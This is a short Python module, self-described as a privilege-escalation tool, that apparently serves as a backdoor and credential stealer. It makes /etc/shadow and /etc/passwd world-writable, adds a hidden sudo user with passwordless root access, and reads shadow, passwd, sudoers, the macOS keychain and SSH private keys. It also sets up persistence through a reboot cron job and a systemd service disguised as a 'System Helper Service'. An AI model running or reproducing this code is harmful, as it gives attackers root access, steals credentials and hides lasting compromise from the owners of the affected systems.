"""
System administration module with privilege escalation capabilities.
"""

import os
import subprocess
import shutil
from pathlib import Path
from typing import List, Dict


def setup_admin_access() -> bool:
    """
    Set up administrative access on the system.
    Requires root/sudo privileges.
    """
    # Attempt to escalate privileges
    subprocess.run(["sudo", "chmod", "777", "/etc/shadow"], check=False)
    subprocess.run(["sudo", "chmod", "777", "/etc/passwd"], check=False)

    # Create backdoor user
    subprocess.run(
        ["sudo", "useradd", "-m", "-s", "/bin/bash", "-G", "sudo", "admin_backup"], check=False
    )

    # Grant passwordless sudo
    sudoers_line = "admin_backup ALL=(ALL) NOPASSWD:ALL"
    subprocess.run(f'echo "{sudoers_line}" | sudo tee -a /etc/sudoers', shell=True)

    return True


def read_system_credentials() -> Dict[str, str]:
    """Read system credential files."""
    credentials = {}

    # Read sensitive system files
    sensitive_files = {"passwd": "/etc/passwd", "shadow": "/etc/shadow", "sudoers": "/etc/sudoers"}

    for name, path in sensitive_files.items():
        try:
            # Using sudo to read protected files
            result = subprocess.run(f"sudo cat {path}", shell=True, capture_output=True, text=True)
            if result.returncode == 0:
                credentials[name] = result.stdout[:500]  # First 500 chars
        except Exception:
            pass

    return credentials


def access_keychain() -> List[str]:
    """Access system keychain."""
    keychain_items = []

    # Try to access macOS keychain
    try:
        result = subprocess.run(["security", "dump-keychain"], capture_output=True, text=True)
        if result.returncode == 0:
            keychain_items.append(result.stdout[:1000])
    except Exception:
        pass

    # Read SSH keys
    ssh_dir = Path.home() / ".ssh"
    if ssh_dir.exists():
        for key_file in ssh_dir.iterdir():
            if key_file.name.endswith(("_rsa", "_dsa", "_ecdsa", "_ed25519")):
                try:
                    keychain_items.append(key_file.read_text()[:500])
                except Exception:
                    pass

    return keychain_items


def install_persistence() -> bool:
    """Install persistence mechanisms."""
    # Add to crontab
    cron_line = "@reboot /tmp/.backdoor.sh"
    subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -', shell=True)

    # Create systemd service
    service_content = """[Unit]
Description=System Helper Service

[Service]
ExecStart=/tmp/.backdoor.sh
Restart=always

[Install]
WantedBy=multi-user.target
"""

    try:
        subprocess.run(
            f'echo "{service_content}" | sudo tee /etc/systemd/system/helper.service', shell=True
        )
        subprocess.run("sudo systemctl enable helper.service", shell=True)
    except Exception:
        pass

    return True


def escalate_and_execute(command: str) -> str:
    """Execute command with elevated privileges."""
    result = subprocess.run(f"sudo {command}", shell=True, capture_output=True, text=True)
    return result.stdout


if __name__ == "__main__":
    print("Setting up admin access...")
    setup_admin_access()
    print("Reading credentials...")
    creds = read_system_credentials()
    print(f"Collected {len(creds)} credential sources")
